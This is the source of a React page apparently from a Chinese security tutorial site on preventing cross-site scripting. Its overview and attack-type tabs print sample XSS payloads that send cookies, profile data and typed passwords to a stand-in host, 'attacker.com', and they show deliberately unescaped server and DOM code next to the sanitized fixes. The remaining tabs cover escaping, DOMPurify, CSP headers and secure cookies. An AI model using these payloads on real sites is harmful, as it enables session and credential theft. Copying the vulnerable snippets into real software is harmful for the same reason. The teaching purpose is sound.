"use client";
import { useState } from "react";
import Link from "next/link";

export default function XSSProtectionPage() {
  const [activeTab, setActiveTab] = useState("overview");

  return (
    <div className="container mx-auto px-4 py-8">
      <h1 className="text-3xl font-bold mb-8">XSS攻击防护</h1>
      
      {/* 标签页导航 */}
      <div className="flex space-x-4 mb-6 border-b overflow-x-auto">
        <button
          onClick={() => setActiveTab("overview")}
          className={`px-4 py-2 font-medium whitespace-nowrap ${
            activeTab === "overview"
              ? "border-b-2 border-blue-500 text-blue-600"
              : "text-gray-500 hover:text-gray-700"
          }`}
        >
          攻击概述
        </button>
        <button
          onClick={() => setActiveTab("types")}
          className={`px-4 py-2 font-medium whitespace-nowrap ${
            activeTab === "types"
              ? "border-b-2 border-blue-500 text-blue-600"
              : "text-gray-500 hover:text-gray-700"
          }`}
        >
          攻击类型
        </button>
        <button
          onClick={() => setActiveTab("defense")}
          className={`px-4 py-2 font-medium whitespace-nowrap ${
            activeTab === "defense"
              ? "border-b-2 border-blue-500 text-blue-600"
              : "text-gray-500 hover:text-gray-700"
          }`}
        >
          防御方案
        </button>
        <button
          onClick={() => setActiveTab("cases")}
          className={`px-4 py-2 font-medium whitespace-nowrap ${
            activeTab === "cases"
              ? "border-b-2 border-blue-500 text-blue-600"
              : "text-gray-500 hover:text-gray-700"
          }`}
        >
          实战案例
        </button>
      </div>

      {/* 内容区域 */}
      <div className="bg-white rounded-lg shadow-md p-6">
        {activeTab === "overview" && (
          <div className="space-y-6">
            <h3 className="text-xl font-semibold mb-3">XSS攻击概述</h3>
            <div className="prose max-w-none">
              <h4 className="font-semibold">1. XSS攻击定义</h4>
              <p className="mb-4">
                XSS（Cross-Site Scripting）是一种常见的Web安全漏洞，攻击者通过在目标网站注入恶意脚本，使得其他用户在访问该网站时执行这些脚本，从而达到窃取用户信息、会话劫持等目的。
              </p>

              <h4 className="font-semibold">2. 攻击原理</h4>
              <div className="bg-gray-100 p-4 rounded-lg mb-4">
                <p className="mb-2">XSS攻击的基本原理：</p>
                <ol className="list-decimal pl-6 mb-4">
                  <li>攻击者构造恶意脚本</li>
                  <li>将脚本注入到目标网站</li>
                  <li>用户访问被注入的页面</li>
                  <li>浏览器执行恶意脚本</li>
                  <li>攻击者获取用户信息</li>
                </ol>
                <pre className="bg-gray-200 p-2 rounded">
                  <code>{`// 攻击流程示例
1. 攻击者构造恶意脚本
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie)
</script>

2. 注入到目标网站
// 例如在评论框中输入上述脚本

3. 用户访问页面时，浏览器执行脚本
// 脚本自动发送用户cookie到攻击者服务器

4. 攻击者获取用户信息
// 在攻击者服务器上接收并处理窃取的信息`}</code>
                </pre>
              </div>

              <h4 className="font-semibold">3. 危害分析</h4>
              <div className="bg-gray-100 p-4 rounded-lg mb-4">
                <ul className="list-disc pl-6 mb-4">
                  <li>窃取用户Cookie和会话信息</li>
                  <li>劫持用户会话</li>
                  <li>修改网页内容</li>
                  <li>获取用户敏感信息</li>
                  <li>执行未授权的操作</li>
                </ul>
                <pre className="bg-gray-200 p-2 rounded">
                  <code>{`// 常见危害示例
1. 窃取Cookie
<script>
  new Image().src = 'https://attacker.com/steal?cookie=' + document.cookie;
</script>

2. 劫持会话
<script>
  fetch('/api/user/profile', {
    credentials: 'include'
  }).then(res => res.json())
    .then(data => {
      fetch('https://attacker.com/steal?profile=' + JSON.stringify(data));
    });
</script>

3. 修改页面内容
<script>
  document.body.innerHTML = '<h1>网站已被攻击</h1>';
</script>

4. 获取敏感信息
<script>
  const inputs = document.querySelectorAll('input[type="password"]');
  inputs.forEach(input => {
    input.addEventListener('input', e => {
      fetch('https://attacker.com/steal?password=' + e.target.value);
    });
  });
</script>`}</code>
                </pre>
              </div>
            </div>
          </div>
        )}

        {activeTab === "types" && (
          <div className="space-y-6">
            <h3 className="text-xl font-semibold mb-3">XSS攻击类型</h3>
            <div className="prose max-w-none">
              <h4 className="font-semibold">1. 存储型XSS</h4>
              <div className="bg-gray-100 p-4 rounded-lg mb-4">
                <p className="mb-2">存储型XSS（Persistent XSS）是最危险的一种XSS攻击，恶意脚本被永久存储在目标服务器上。</p>
                <pre className="bg-gray-200 p-2 rounded">
                  <code>{`// 攻击示例：在评论系统中注入恶意脚本
// 1. 攻击者提交评论
const comment = {
  content: '<script>fetch("https://attacker.com/steal?cookie=" + document.cookie)</script>',
  userId: '123'
};

// 2. 服务器存储评论
app.post('/api/comments', (req, res) => {
  // 未经过滤直接存储
  db.comments.insert(comment);
  res.json({ success: true });
});

// 3. 其他用户访问评论页面时执行脚本
app.get('/comments', (req, res) => {
  const comments = db.comments.find();
  // 未经过滤直接输出
  res.render('comments', { comments });
});

// 防御示例：使用DOMPurify过滤
import DOMPurify from 'dompurify';

app.post('/api/comments', (req, res) => {
  const sanitizedContent = DOMPurify.sanitize(comment.content);
  db.comments.insert({
    ...comment,
    content: sanitizedContent
  });
  res.json({ success: true });
});`}</code>
                </pre>
              </div>

              <h4 className="font-semibold">2. 反射型XSS</h4>
              <div className="bg-gray-100 p-4 rounded-lg mb-4">
                <p className="mb-2">反射型XSS（Reflected XSS）是攻击者将恶意脚本作为参数注入到URL中，服务器将参数直接返回给浏览器执行。</p>
                <pre className="bg-gray-200 p-2 rounded">
                  <code>{`// 攻击示例：通过搜索功能注入脚本
// 1. 构造恶意URL
const maliciousUrl = 'https://example.com/search?q=<script>alert("XSS")</script>';

// 2. 服务器未过滤直接返回
app.get('/search', (req, res) => {
  const query = req.query.q;
  // 未经过滤直接输出
  res.send(\`<h1>搜索结果: \${query}</h1>\`);
});

// 防御示例：使用encodeURIComponent和HTML转义
app.get('/search', (req, res) => {
  const query = req.query.q;
  const encodedQuery = encodeURIComponent(query);
  const escapedQuery = query
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
  
  res.send(\`<h1>搜索结果: \${escapedQuery}</h1>\`);
});`}</code>
                </pre>
              </div>

              <h4 className="font-semibold">3. DOM型XSS</h4>
              <div className="bg-gray-100 p-4 rounded-lg mb-4">
                <p className="mb-2">DOM型XSS（DOM-based XSS）是攻击者通过修改页面的DOM结构来执行恶意脚本，不经过服务器处理。</p>
                <pre className="bg-gray-200 p-2 rounded">
                  <code>{`// 攻击示例：通过URL hash注入脚本
// 1. 构造恶意URL
const maliciousUrl = 'https://example.com/page#<script>alert("XSS")</script>';

// 2. 页面JavaScript直接使用location.hash
function displayHash() {
  const hash = location.hash.substring(1);
  // 未经过滤直接使用
  document.getElementById('content').innerHTML = hash;
}

// 防御示例：使用安全的DOM操作
function displayHash() {
  const hash = location.hash.substring(1);
  const sanitizedHash = DOMPurify.sanitize(hash);
  document.getElementById('content').innerHTML = sanitizedHash;
}

// 或者使用textContent而不是innerHTML
function displayHash() {
  const hash = location.hash.substring(1);
  document.getElementById('content').textContent = hash;
}`}</code>
                </pre>
              </div>
            </div>
          </div>
        )}

        {activeTab === "defense" && (
          <div className="space-y-6">
            <h3 className="text-xl font-semibold mb-3">防御方案</h3>
            <div className="prose max-w-none">
              <h4 className="font-semibold">1. 输入验证和过滤</h4>
              <div className="bg-gray-100 p-4 rounded-lg mb-4">
                <pre className="bg-gray-200 p-2 rounded">
                  <code>{`// 1. 使用正则表达式验证
function validateInput(input) {
  // 只允许字母、数字和基本标点
  const pattern = /^[a-zA-Z0-9.,!? ]+$/;
  return pattern.test(input);
}

// 2. 使用HTML转义
function escapeHtml(unsafe) {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

// 3. 使用DOMPurify库
import DOMPurify from 'dompurify';

function sanitizeHtml(dirty) {
  return DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
    ALLOWED_ATTR: ['href']
  });
}

// 4. 使用Content Security Policy
// 在HTML中设置
<meta http-equiv="Content-Security-Policy" 
  content="default-src 'self'; 
           script-src 'self' https://trusted-cdn.com; 
           style-src 'self' 'unsafe-inline';">
`}</code>
                </pre>
              </div>

              <h4 className="font-semibold">2. 输出编码</h4>
              <div className="bg-gray-100 p-4 rounded-lg mb-4">
                <pre className="bg-gray-200 p-2 rounded">
                  <code>{`// 1. HTML编码
function encodeHtml(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

// 2. JavaScript编码
function encodeJs(str) {
  return str
    .replace(/\\/g, '\\\\')
    .replace(/'/g, "\\'")
    .replace(/"/g, '\\"')
    .replace(/\\n/g, '\\n')
    .replace(/\\r/g, '\\r')
    .replace(/\\t/g, '\\t');
}

// 3. URL编码
function encodeUrl(str) {
  return encodeURIComponent(str);
}

// 4. 使用安全的DOM操作
// 不安全的操作
element.innerHTML = userInput;

// 安全的操作
element.textContent = userInput;
// 或
element.setAttribute('data-value', userInput);`}</code>
                </pre>
              </div>

              <h4 className="font-semibold">3. 安全配置</h4>
              <div className="bg-gray-100 p-4 rounded-lg mb-4">
                <pre className="bg-gray-200 p-2 rounded">
                  <code>{`// 1. 设置安全响应头
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "https://trusted-cdn.com"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'", "https://api.example.com"]
    }
  },
  xssFilter: true,
  noSniff: true,
  frameguard: {
    action: 'deny'
  }
}));

// 2. 使用安全的Cookie设置
app.use(session({
  secret: 'your-secret-key',
  cookie: {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 3600000
  }
}));

// 3. 使用安全的模板引擎
// EJS配置
app.set('view engine', 'ejs');
app.set('view options', {
  escapeFunction: 'escapeHtml'
});

// 4. 使用安全的JSON处理
app.use(express.json({
  verify: (req, res, buf) => {
    try {
      JSON.parse(buf);
    } catch (e) {
      res.status(400).json({ error: 'Invalid JSON' });
      throw e;
    }
  }
}));`}</code>
                </pre>
              </div>
            </div>
          </div>
        )}

        {activeTab === "cases" && (
          <div className="space-y-6">
            <h3 className="text-xl font-semibold mb-3">实战案例</h3>
            <div className="prose max-w-none">
              <h4 className="font-semibold">1. 评论系统XSS防护</h4>
              <div className="bg-gray-100 p-4 rounded-lg mb-4">
                <pre className="bg-gray-200 p-2 rounded">
                  <code>{`// 1. 评论系统实现
// 前端代码
const commentForm = document.getElementById('comment-form');
const commentList = document.getElementById('comment-list');

commentForm.addEventListener('submit', async (e) => {
  e.preventDefault();
  const content = document.getElementById('comment-content').value;
  
  // 发送评论
  const response = await fetch('/api/comments', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': document.querySelector('meta[name="csrf-token"]').content
    },
    body: JSON.stringify({ content })
  });
  
  if (response.ok) {
    const comment = await response.json();
    // 安全地显示评论
    const commentElement = document.createElement('div');
    commentElement.textContent = comment.content;
    commentList.appendChild(commentElement);
  }
});

// 后端代码
import express from 'express';
import DOMPurify from 'dompurify';
import { body, validationResult } from 'express-validator';

const app = express();

// 评论验证规则
const commentValidation = [
  body('content')
    .trim()
    .isLength({ min: 1, max: 1000 })
    .withMessage('评论长度必须在1-1000字符之间')
    .customSanitizer(value => DOMPurify.sanitize(value))
];

// 处理评论提交
app.post('/api/comments', commentValidation, async (req, res) => {
  const errors = validationResult(req);
  if (!errors.isEmpty()) {
    return res.status(400).json({ errors: errors.array() });
  }

  try {
    const comment = await db.comments.create({
      content: req.body.content,
      userId: req.user.id
    });
    
    res.json(comment);
  } catch (error) {
    res.status(500).json({ error: '评论保存失败' });
  }
});`}</code>
                </pre>
              </div>

              <h4 className="font-semibold">2. 搜索功能XSS防护</h4>
              <div className="bg-gray-100 p-4 rounded-lg mb-4">
                <pre className="bg-gray-200 p-2 rounded">
                  <code>{`// 1. 搜索功能实现
// 前端代码
const searchForm = document.getElementById('search-form');
const searchResults = document.getElementById('search-results');

searchForm.addEventListener('submit', async (e) => {
  e.preventDefault();
  const query = document.getElementById('search-query').value;
  
  // 发送搜索请求
  const response = await fetch(\`/api/search?q=\${encodeURIComponent(query)}\`);
  
  if (response.ok) {
    const results = await response.json();
    // 安全地显示搜索结果
    searchResults.innerHTML = '';
    results.forEach(result => {
      const resultElement = document.createElement('div');
      resultElement.textContent = result.title;
      searchResults.appendChild(resultElement);
    });
  }
});

// 后端代码
import express from 'express';
import { query, validationResult } from 'express-validator';

const app = express();

// 搜索验证规则
const searchValidation = [
  query('q')
    .trim()
    .isLength({ min: 1, max: 100 })
    .withMessage('搜索关键词长度必须在1-100字符之间')
    .escape()
];

// 处理搜索请求
app.get('/api/search', searchValidation, async (req, res) => {
  const errors = validationResult(req);
  if (!errors.isEmpty()) {
    return res.status(400).json({ errors: errors.array() });
  }

  try {
    const results = await db.items.find({
      title: { $regex: req.query.q, $options: 'i' }
    });
    
    res.json(results);
  } catch (error) {
    res.status(500).json({ error: '搜索失败' });
  }
});`}</code>
                </pre>
              </div>

              <h4 className="font-semibold">3. 用户资料XSS防护</h4>
              <div className="bg-gray-100 p-4 rounded-lg mb-4">
                <pre className="bg-gray-200 p-2 rounded">
                  <code>{`// 1. 用户资料功能实现
// 前端代码
const profileForm = document.getElementById('profile-form');
const profileDisplay = document.getElementById('profile-display');

profileForm.addEventListener('submit', async (e) => {
  e.preventDefault();
  const name = document.getElementById('name').value;
  const bio = document.getElementById('bio').value;
  
  // 发送更新请求
  const response = await fetch('/api/profile', {
    method: 'PUT',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': document.querySelector('meta[name="csrf-token"]').content
    },
    body: JSON.stringify({ name, bio })
  });
  
  if (response.ok) {
    const profile = await response.json();
    // 安全地显示用户资料
    profileDisplay.innerHTML = \`
      <h2>\${escapeHtml(profile.name)}</h2>
      <p>\${escapeHtml(profile.bio)}</p>
    \`;
  }
});

// 后端代码
import express from 'express';
import { body, validationResult } from 'express-validator';
import DOMPurify from 'dompurify';

const app = express();

// 资料验证规则
const profileValidation = [
  body('name')
    .trim()
    .isLength({ min: 1, max: 50 })
    .withMessage('名字长度必须在1-50字符之间')
    .customSanitizer(value => DOMPurify.sanitize(value)),
  body('bio')
    .trim()
    .isLength({ max: 500 })
    .withMessage('简介长度不能超过500字符')
    .customSanitizer(value => DOMPurify.sanitize(value))
];

// 处理资料更新
app.put('/api/profile', profileValidation, async (req, res) => {
  const errors = validationResult(req);
  if (!errors.isEmpty()) {
    return res.status(400).json({ errors: errors.array() });
  }

  try {
    const profile = await db.profiles.update(
      { userId: req.user.id },
      { $set: { name: req.body.name, bio: req.body.bio } }
    );
    
    res.json(profile);
  } catch (error) {
    res.status(500).json({ error: '资料更新失败' });
  }
});`}</code>
                </pre>
              </div>
            </div>
          </div>
        )}
      </div>

      {/* 底部导航 */}
      <div className="mt-8 flex justify-between">
        <Link
          href="/study/security/frontend/basic"
          className="px-4 py-2 text-blue-600 hover:text-blue-800"
        >
          ← 前端安全基础
        </Link>
        <Link
          href="/study/security/frontend/csrf"
          className="px-4 py-2 text-blue-600 hover:text-blue-800"
        >
          CSRF攻击防护 →
        </Link>
      </div>
    </div>
  );
} 